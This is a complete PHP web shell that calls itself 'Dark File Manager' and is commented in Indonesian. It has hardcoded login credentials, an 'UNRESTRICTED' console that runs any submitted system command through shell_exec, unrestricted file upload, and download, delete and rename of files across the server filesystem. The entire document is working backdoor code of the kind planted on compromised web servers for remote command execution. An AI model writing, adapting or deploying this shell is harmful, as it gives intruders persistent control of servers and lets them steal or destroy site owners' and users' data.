<?php
session_start();

// ==============================================
// KONFIGURASI USER
// ==============================================
$valid_users = [
    'asuu' => password_hash('1337', PASSWORD_BCRYPT),
    'ssk' => password_hash('ssk', PASSWORD_BCRYPT)
];

// ==============================================
// FUNGSI UTILITAS
// ==============================================
function login($username, $password) {
    global $valid_users;
    
    if (isset($valid_users[$username]) && password_verify($password, $valid_users[$username])) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
        return true;
    }
    return false;
}

function logout() {
    session_unset();
    session_destroy();
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function sanitizePath($path) {
    $path = str_replace(['../', '..\\'], '', $path);
    return realpath($path) ?: getcwd();
}

// ==============================================
// PROSES LOGIN/LOGOUT
// ==============================================
if (isset($_GET['logout'])) {
    logout();
    header('Location: ?');
    exit;
}

if (isset($_POST['login'])) {
    if (login($_POST['username'], $_POST['password'])) {
        header('Location: ?');
        exit;
    } else {
        $login_error = 'Username atau password salah!';
    }
}

// ==============================================
// CEK AUTHENTIKASI
// ==============================================
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (!$authenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Dark File Manager</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            :root {
                --dark-bg: #1a1a2e;
                --darker-bg: #16213e;
                --primary: #4e73df;
                --primary-hover: #3a56b5;
                --text: #e6e6e6;
                --text-muted: #b3b3b3;
            }
            
            body {
                background-color: var(--dark-bg);
                color: var(--text);
                height: 100vh;
                display: flex;
                align-items: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            .login-card {
                width: 100%;
                max-width: 400px;
                margin: 0 auto;
                background-color: var(--darker-bg);
                border: none;
                border-radius: 10px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }
            
            .login-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
            }
            
            .brand-logo {
                font-size: 2.5rem;
                margin-bottom: 1.5rem;
                color: var(--primary);
                text-shadow: 0 0 10px rgba(78, 115, 223, 0.5);
            }
            
            .form-control {
                background-color: rgba(255, 255, 255, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
                color: var(--text);
                transition: all 0.3s ease;
            }
            
            .form-control:focus {
                background-color: rgba(255, 255, 255, 0.15);
                border-color: var(--primary);
                box-shadow: 0 0 0 0.25rem rgba(78, 115, 223, 0.25);
                color: var(--text);
            }
            
            .btn-primary {
                background-color: var(--primary);
                border: none;
                padding: 10px;
                font-weight: 600;
                letter-spacing: 0.5px;
                transition: all 0.3s ease;
            }
            
            .btn-primary:hover {
                background-color: var(--primary-hover);
                transform: translateY(-2px);
            }
            
            .alert {
                background-color: rgba(220, 53, 69, 0.2);
                border: 1px solid rgba(220, 53, 69, 0.3);
                color: #ff6b6b;
            }
            
            h4 {
                color: var(--text);
                font-weight: 600;
            }
            
            ::placeholder {
                color: var(--text-muted) !important;
                opacity: 1;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="card login-card">
                <div class="card-body p-4">
                    <div class="text-center mb-4">
                        <div class="brand-logo">
                            <i class="fas fa-folder-open"></i>
                        </div>
                        <h4>Dark File Manager</h4>
                        <p class="text-muted">Secure file management system</p>
                    </div>
                    
                    <?php if (isset($login_error)): ?>
                        <div class="alert alert-danger"><?php echo htmlspecialchars($login_error); ?></div>
                    <?php endif; ?>
                    
                    <form method="post">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username</label>
                            <input type="text" class="form-control" id="username" name="username" required placeholder="Enter your username">
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <input type="password" class="form-control" id="password" name="password" required placeholder="Enter your password">
                        </div>
                        <button type="submit" name="login" class="btn btn-primary w-100">
                            <i class="fas fa-sign-in-alt me-2"></i>Login
                        </button>
                    </form>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

// ==============================================
// FILE MANAGER (HANYA BISA DIAKSES SETELAH LOGIN)
// ==============================================
$dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getcwd();
$all_files = scandir($dir);

// Pisahkan folder dan file
$folders = array();
$files = array();

foreach ($all_files as $file) {
    if ($file === '.' || $file === '..') continue;
    $filePath = realpath($dir . '/' . $file);
    if (is_dir($filePath)) {
        $folders[] = $file;
    } else {
        $files[] = $file;
    }
}

// Gabungkan array dengan folder dulu
$sorted_files = array_merge($folders, $files);

// Proses Upload File
if (isset($_FILES['file'])) {
    $target_file = $dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        $upload_success = 'File berhasil diupload!';
    } else {
        $upload_error = 'Gagal mengupload file!';
    }
}

// ==============================================
// BAGIAN YANG DIUBAH: COMMAND EXECUTION TANPA BATASAN
// ==============================================
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1'); // 2>&1 untuk menangkap error output juga
    
    // Logging untuk keamanan
    file_put_contents('command_log.txt', 
        date('Y-m-d H:i:s') . ' - ' . $_SESSION['username'] . ' - ' . $cmd . PHP_EOL, 
        FILE_APPEND);
}

// Proses Delete File
if (isset($_POST['delete'])) {
    $fileToDelete = sanitizePath($dir . '/' . $_POST['delete']);
    if (is_file($fileToDelete)) {
        unlink($fileToDelete);
        $delete_success = 'File berhasil dihapus!';
    }
}

// Proses Create Folder
if (isset($_POST['create_folder'])) {
    $newFolder = $dir . '/' . preg_replace('/[^a-zA-Z0-9-_]/', '', $_POST['create_folder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        $folder_success = 'Folder berhasil dibuat!';
    }
}

// Proses Rename File
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldName = sanitizePath($dir . '/' . $_POST['rename_old']);
    $newName = $dir . '/' . $_POST['rename_new'];
    if (file_exists($oldName)) {
        rename($oldName, $newName);
        $rename_success = 'File berhasil diubah nama!';
    }
}

// Proses Download File
if (isset($_GET['download'])) {
    $fileToDownload = sanitizePath($dir . '/' . $_GET['download']);
    if (is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --dark-bg: #1a1a2e;
            --darker-bg: #16213e;
            --dark-card: #0f3460;
            --primary: #4e73df;
            --primary-hover: #3a56b5;
            --success: #28a745;
            --danger: #dc3545;
            --warning: #ffc107;
            --info: #17a2b8;
            --text: #e6e6e6;
            --text-muted: #b3b3b3;
            --border-color: #2a3a5a;
        }
        
        body {
            background-color: var(--dark-bg);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .card {
            background-color: var(--dark-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
        }
        
        .card-header {
            background-color: rgba(0, 0, 0, 0.2);
            border-bottom: 1px solid var(--border-color);
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .file-icon {
            color: var(--info);
            font-size: 1.5rem;
            margin-right: 10px;
            transition: all 0.2s ease;
        }
        
        .folder-icon {
            color: var(--primary);
            font-size: 1.5rem;
            margin-right: 10px;
            transition: all 0.2s ease;
        }
        
        .breadcrumb {
            background-color: transparent;
            padding: 0;
        }
        
        .breadcrumb-item a {
            color: var(--primary);
            text-decoration: none;
            transition: color 0.2s ease;
        }
        
        .breadcrumb-item a:hover {
            color: var(--primary-hover);
            text-decoration: underline;
        }
        
        .action-btn {
            padding: 0.25rem 0.5rem;
            font-size: 0.875rem;
            transition: all 0.2s ease;
        }
        
        .action-btn:hover {
            transform: translateY(-2px);
        }
        
        .file-row {
            transition: all 0.2s ease;
            border-bottom: 1px solid var(--border-color);
        }
        
        .file-row:hover {
            background-color: rgba(78, 115, 223, 0.1);
            transform: translateX(5px);
        }
        
        .file-row:hover .file-icon,
        .file-row:hover .folder-icon {
            transform: scale(1.1);
        }
        
        .table {
            color: var(--text);
            border-color: var(--border-color);
        }
        
        .table thead th {
            border-bottom: 2px solid var(--border-color);
        }
        
        .table-hover tbody tr:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .form-control {
            background-color: rgba(255, 255, 255, 0.1);
            border: 1px solid var(--border-color);
            color: var(--text);
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            background-color: rgba(255, 255, 255, 0.15);
            border-color: var(--primary);
            box-shadow: 0 0 0 0.25rem rgba(78, 115, 223, 0.25);
            color: var(--text);
        }
        
        .btn-primary {
            background-color: var(--primary);
            border: none;
        }
        
        .btn-success {
            background-color: var(--success);
            border: none;
        }
        
        .btn-danger {
            background-color: var(--danger);
            border: none;
        }
        
        .btn-warning {
            background-color: var(--warning);
            border: none;
            color: #212529;
        }
        
        .btn-dark {
            background-color: var(--darker-bg);
            border: none;
        }
        
        .btn:hover {
            filter: brightness(90%);
            transform: translateY(-2px);
        }
        
        .badge {
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        
        .alert {
            border: none;
        }
        
        .alert-info {
            background-color: rgba(23, 162, 184, 0.2);
            color: var(--info);
        }
        
        .console-output {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: 'Courier New', monospace;
            min-height: 200px;
            max-height: 300px;
            overflow-y: auto;
            border-radius: 6px;
            border: 1px solid #30363d;
            padding: 16px;
        }
        
        .status-message {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            animation: fadeInOut 3s ease-in-out;
        }
        
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(-20px); }
            10% { opacity: 1; transform: translateY(0); }
            90% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(-20px); }
        }
        
        .modal-content {
            background-color: var(--dark-card);
            color: var(--text);
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-footer {
            border-top: 1px solid var(--border-color);
        }
        
        .btn-close {
            filter: invert(1);
        }
        
        ::placeholder {
            color: var(--text-muted) !important;
            opacity: 1;
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--dark-bg);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--primary);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-hover);
        }
        
        .command-history {
            max-height: 150px;
            overflow-y: auto;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.2);
        }
        
        .command-item {
            padding: 5px;
            border-bottom: 1px solid var(--border-color);
            cursor: pointer;
        }
        
        .command-item:hover {
            background-color: rgba(78, 115, 223, 0.1);
        }
    </style>
</head>
<body>
    <!-- Notifikasi -->
    <?php if (isset($upload_success)): ?>
        <div class="status-message">
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <?php echo htmlspecialchars($upload_success); ?>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($upload_error)): ?>
        <div class="status-message">
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <?php echo htmlspecialchars($upload_error); ?>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($delete_success)): ?>
        <div class="status-message">
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <?php echo htmlspecialchars($delete_success); ?>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($folder_success)): ?>
        <div class="status-message">
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <?php echo htmlspecialchars($folder_success); ?>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($rename_success)): ?>
        <div class="status-message">
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <?php echo htmlspecialchars($rename_success); ?>
            </div>
        </div>
    <?php endif; ?>

    <div class="container-fluid py-4">
        <div class="card mb-4">
            <div class="card-header py-3 d-flex justify-content-between align-items-center">
                <h4 class="m-0 font-weight-bold">
                    <i class="fas fa-folder-open me-2"></i>Dark File Manager
                </h4>
                <div>
                    <span class="badge bg-primary me-2">
                        <i class="fas fa-user me-1"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
                    </span>
                    <a href="?logout" class="btn btn-sm btn-danger">
                        <i class="fas fa-sign-out-alt me-1"></i>Logout
                    </a>
                </div>
            </div>
            <div class="card-body">
                <nav aria-label="breadcrumb">
                    <ol class="breadcrumb">
                        <li class="breadcrumb-item">
                            <i class="fas fa-home"></i>
                            <a href="?dir=<?php echo urlencode(getcwd()); ?>" class="text-decoration-none">Home</a>
                        </li>
                        <?php 
                            $pathParts = explode(DIRECTORY_SEPARATOR, $dir);
                            $currentPath = '';
                            foreach ($pathParts as $part) {
                                if ($part) {
                                    $currentPath .= DIRECTORY_SEPARATOR . $part;
                                    echo '<li class="breadcrumb-item"><a href="?dir=' . urlencode($currentPath) . '" class="text-decoration-none">' . $part . '</a></li>';
                                }
                            }
                        ?>
                    </ol>
                </nav>

                <div class="alert alert-info mb-4">
                    <i class="fas fa-info-circle me-2"></i> Current Directory: 
                    <strong><?php echo htmlspecialchars($dir); ?></strong>
                </div>

                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($sorted_files as $file): ?>
                                <?php $filePath = realpath($dir . '/' . $file); ?>
                                <tr class="file-row align-middle">
                                    <td>
                                        <div class="d-flex align-items-center">
                                            <?php if (is_dir($filePath)): ?>
                                                <i class="fas fa-folder folder-icon"></i>
                                                <a href="?dir=<?php echo urlencode($filePath); ?>" class="text-decoration-none">
                                                    <?php echo $file; ?>
                                                </a>
                                            <?php else: ?>
                                                <i class="fas fa-file file-icon"></i>
                                                <span><?php echo $file; ?></span>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    <td><?php echo is_file($filePath) ? formatSize(filesize($filePath)) : '<span class="badge bg-info">Folder</span>'; ?></td>
                                    <td><?php echo date("Y-m-d H:i:s", filemtime($filePath)); ?></td>
                                    <td>
                                        <div class="d-flex gap-2">
                                            <?php if (is_file($filePath)): ?>
                                                <a href="?dir=<?php echo urlencode($dir); ?>&download=<?php echo urlencode($file); ?>" 
                                                   class="btn btn-sm btn-success action-btn" title="Download">
                                                    <i class="fas fa-download"></i>
                                                </a>
                                                <form method="post" class="d-inline">
                                                    <input type="hidden" name="delete" value="<?php echo htmlspecialchars($file); ?>">
                                                    <button type="submit" class="btn btn-sm btn-danger action-btn" title="Delete">
                                                        <i class="fas fa-trash"></i>
                                                    </button>
                                                </form>
                                                <button type="button" class="btn btn-sm btn-warning action-btn rename-btn" 
                                                        data-filename="<?php echo htmlspecialchars($file); ?>" title="Rename">
                                                    <i class="fas fa-edit"></i>
                                                </button>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="col-md-6 mb-4">
                <div class="card h-100">
                    <div class="card-header bg-primary">
                        <i class="fas fa-upload me-2"></i> Upload File
                    </div>
                    <div class="card-body">
                        <form method="post" enctype="multipart/form-data" class="dropzone" id="fileUploadForm">
                            <div class="mb-3">
                                <label for="fileInput" class="form-label">Select file to upload:</label>
                                <input class="form-control" type="file" id="fileInput" name="file" required>
                            </div>
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-upload me-1"></i> Upload
                            </button>
                        </form>
                    </div>
                </div>
            </div>

            <div class="col-md-6 mb-4">
                <div class="card h-100">
                    <div class="card-header bg-success">
                        <i class="fas fa-folder-plus me-2"></i> Create Folder
                    </div>
                    <div class="card-body">
                        <form method="post">
                            <div class="mb-3">
                                <label for="folderName" class="form-label">Folder name:</label>
                                <div class="input-group">
                                    <input type="text" class="form-control" id="folderName" name="create_folder" placeholder="Enter folder name" required>
                                    <button type="submit" class="btn btn-success">
                                        <i class="fas fa-plus me-1"></i> Create
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- ============================================== -->
        <!-- BAGIAN YANG DIUBAH: ADVANCED COMMAND CONSOLE -->
        <!-- ============================================== -->
        <div class="card mb-4">
            <div class="card-header bg-danger text-white">
                <i class="fas fa-terminal me-2"></i> Advanced Command Console (UNRESTRICTED)
            </div>
            <div class="card-body">
                <div class="alert alert-danger mb-4">
                    <i class="fas fa-exclamation-triangle me-2"></i>
                    <strong>WARNING:</strong> This console has full system access. Use with extreme caution!
                </div>

                <form method="post">
                    <div class="mb-3">
                        <label for="commandInput" class="form-label">Enter any system command:</label>
                        
                        <!-- Command History -->
                        <?php
                        $command_history = [];
                        if (file_exists('command_log.txt')) {
                            $command_history = array_reverse(array_unique(file('command_log.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)));
                            $command_history = array_slice($command_history, 0, 10); // Limit to last 10 commands
                        }
                        ?>
                        
                        <?php if (!empty($command_history)): ?>
                        <div class="command-history mb-3">
                            <h6>Recent Commands:</h6>
                            <?php foreach ($command_history as $cmd): ?>
                                <?php 
                                    $parts = explode(' - ', $cmd);
                                    $actual_cmd = end($parts);
                                ?>
                                <div class="command-item" onclick="document.getElementById('commandInput').value = '<?php echo htmlspecialchars($actual_cmd, ENT_QUOTES); ?>'">
                                    <small><?php echo htmlspecialchars($actual_cmd); ?></small>
                                </div>
                            <?php endforeach; ?>
                        </div>
                        <?php endif; ?>
                        
                        <div class="input-group">
                            <span class="input-group-text">$</span>
                            <input type="text" class="form-control" id="commandInput" name="cmd" 
                                   placeholder="Enter any command (e.g. wget, chmod, git, etc.)" required>
                            <button type="submit" class="btn btn-danger">
                                <i class="fas fa-play me-1"></i> Execute
                            </button>
                        </div>
                        <small class="text-muted mt-1 d-block">
                            Examples: <code>ls -la</code>, <code>wget http://example.com/file</code>, <code>chmod 755 script.sh</code>
                        </small>
                    </div>
                </form>
                
                <?php if (isset($output)): ?>
                    <div class="console-output p-3 mt-3 rounded">
                        <pre class="m-0"><?php echo htmlspecialchars($output); ?></pre>
                    </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
    <div class="modal fade" id="renameModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Rename File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" id="renameOld" name="rename_old">
                        <div class="mb-3">
                            <label for="renameNew" class="form-label">New name:</label>
                            <input type="text" class="form-control" id="renameNew" name="rename_new" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Handle rename button clicks
        document.querySelectorAll('.rename-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const filename = this.getAttribute('data-filename');
                document.getElementById('renameOld').value = filename;
                document.getElementById('renameNew').value = filename;
                const modal = new bootstrap.Modal(document.getElementById('renameModal'));
                modal.show();
            });
        });

        // Refresh page after file upload
        document.getElementById('fileUploadForm').addEventListener('submit', function() {
            setTimeout(() => { location.reload(); }, 1000);
        });

        // Auto-hide status messages after 3 seconds
        setTimeout(() => {
            document.querySelectorAll('.status-message').forEach(el => {
                el.style.display = 'none';
            });
        }, 3000);

        // Command history click handler
        document.querySelectorAll('.command-item').forEach(item => {
            item.addEventListener('click', function() {
                const cmd = this.textContent.trim();
                document.getElementById('commandInput').value = cmd;
                document.getElementById('commandInput').focus();
            });
        });
    </script>
</body>
</html>